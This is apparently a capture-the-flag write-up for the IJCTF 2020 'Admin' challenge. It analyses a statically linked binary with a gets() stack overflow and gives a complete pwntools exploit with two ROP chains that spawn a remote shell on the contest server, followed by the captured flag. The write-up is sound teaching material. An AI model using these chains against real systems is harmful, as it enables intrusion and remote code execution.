# IJCTF 2020

## Admin

> 100
> 
> This admin thinks his system is very safe Is it actually safe? I say it's safe what do you think?
> 
> `nc 35.186.153.116 7002`
> 
> Challenge file: [https://github.com/linuxjustin/IJCTF2020/blob/master/pwn/admin](admin)
> 
> Author: zilikos

Tags: _pwn_ _bof_ _gets_ _remote-shell_


### Analysis

#### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Few mitigations in place, basically no shellcode, everything else is fair game.


#### File

```
admin: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=0ee31668ec040c05db870d1fcef7e198c0a53d37, stripped
```

Statically linked relatively large binary.  ROP rich.


#### Decompile with Ghidra

```c
void FUN_00400b4d(undefined8 param_1,undefined *param_2)

{
  int iVar1;
  char *pcVar2;
  undefined local_48 [64];
  
  FUN_004104e0("Username: ",param_2);
  FUN_00410330(local_48,param_2);
  pcVar2 = "admin";
  iVar1 = thunk_FUN_004004ce(local_48);
  if (iVar1 == 0) {
    FUN_004104e0("Welcome admin",pcVar2);
  }
  else {
    FUN_0040f6b0("Bye %s\n",local_48);
  }
  return;
}
```

"`main`" looks pretty basic; 64-byte buffer (`local_48`), prompt for `Username:`, assume `FUN_00410330` reads input from stdin, and check for a match.

Assuming `FUN_00410330` is `gets`, test with:

```bash
# cyclic 100 | ./admin
Username:
Bye aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Segmentation fault
```

Probably `gets`.

Stack diagram from Ghidra:

```
undefined         AL:1               <RETURN>
undefined8        RDI:8              param_1
undefined *       RSI:8              param_2
undefined1        Stack[-0x48]:1     local_48                                
```

Buffer is `0x48` bytes above return address.  With large static binary and _No PIE_, attempt ROP.

#### ROP options

Both:

```bash
ropper --file admin --chain "execve cmd=/bin/sh" --badbytes 0a
```

and

```bash
ROPgadget --binary admin --ropchain
```

return ROP chains for a shell.  Time to test.


### Exploit

#### Send `0x48` bytes:

```python
#!/usr/bin/env python3

from pwn import *

#p = process('./admin')
p = remote('35.186.153.116', 7002)

#p.recvuntil('Username: \n')
payload = 0x48 * b'A'
```

> This works locally, but remotely I had to comment out the `recvuntil`--probably a buffering issue on their end.


#### Send ROP chain

Option A: (ropper):

```python
IMAGE_BASE_0 = 0x0000000000400000 # 09c2fc813db5d38d1a82c5049191b426ffcd29dfdc71bf33b5630dae57b2f56b
pp = lambda x : p64(x)
rebase_0 = lambda x : pp(x + IMAGE_BASE_0)

rop = b''
rop += rebase_0(0x000000000000da9b) # 0x000000000040da9b: pop r13; ret;
rop += b'//bin/sh'
rop += rebase_0(0x0000000000000686) # 0x0000000000400686: pop rdi; ret;
rop += rebase_0(0x00000000002b90e0)
rop += rebase_0(0x0000000000068609) # 0x0000000000468609: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += pp(0xdeadbeefdeadbeef)
rop += pp(0xdeadbeefdeadbeef)
rop += pp(0xdeadbeefdeadbeef)
rop += pp(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000000da9b) # 0x000000000040da9b: pop r13; ret;
rop += pp(0x0000000000000000)
rop += rebase_0(0x0000000000000686) # 0x0000000000400686: pop rdi; ret;
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x0000000000068609) # 0x0000000000468609: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += pp(0xdeadbeefdeadbeef)
rop += pp(0xdeadbeefdeadbeef)
rop += pp(0xdeadbeefdeadbeef)
rop += pp(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000000686) # 0x0000000000400686: pop rdi; ret;
rop += rebase_0(0x00000000002b90e0)
rop += rebase_0(0x0000000000010193) # 0x0000000000410193: pop rsi; ret;
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x000000000004bcc6) # 0x000000000044bcc6: pop rdx; ret;
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x0000000000015544) # 0x0000000000415544: pop rax; ret;
rop += pp(0x000000000000003b)
rop += rebase_0(0x0000000000074d15) # 0x0000000000474d15: syscall; ret;
```

Option B: (ROPgadget):

```python
rop  = b''
rop += p64(0x0000000000410193) # pop rsi ; ret
rop += p64(0x00000000006b90e0) # @ .data
rop += p64(0x0000000000415544) # pop rax ; ret
rop += b'/bin//sh'
rop += p64(0x000000000047f321) # mov qword ptr [rsi], rax ; ret
rop += p64(0x0000000000410193) # pop rsi ; ret
rop += p64(0x00000000006b90e8) # @ .data + 8
rop += p64(0x0000000000444aa0) # xor rax, rax ; ret
rop += p64(0x000000000047f321) # mov qword ptr [rsi], rax ; ret
rop += p64(0x0000000000400686) # pop rdi ; ret
rop += p64(0x00000000006b90e0) # @ .data
rop += p64(0x0000000000410193) # pop rsi ; ret
rop += p64(0x00000000006b90e8) # @ .data + 8
rop += p64(0x0000000000449765) # pop rdx ; ret
rop += p64(0x00000000006b90e8) # @ .data + 8
rop += p64(0x0000000000444aa0) # xor rax, rax ; ret
rop += 59 * p64(0x0000000000474770) # add rax, 1 ; ret
rop += p64(0x000000000040123c) # syscall
```

Both `ropper` and `ROPgadget` output Python2 code, the above were converted for Python3.

> Both were tested.

Then:

```python
payload += rop

p.sendline(payload)
p.interactive()
```

Run it.

Output:

```
# ./exploit.py
[+] Opening connection to 35.186.153.116 on port 7002: Done
[*] Switching to interactive mode
$ ls
admin
bin
dev
flag.txt
lib
lib32
lib64
$ cat flag.txt
IJCTF{W3lc0m3_4g4in_d34r_AADMMIINN!!!}
```

#### Flag

```
IJCTF{W3lc0m3_4g4in_d34r_AADMMIINN!!!}
```
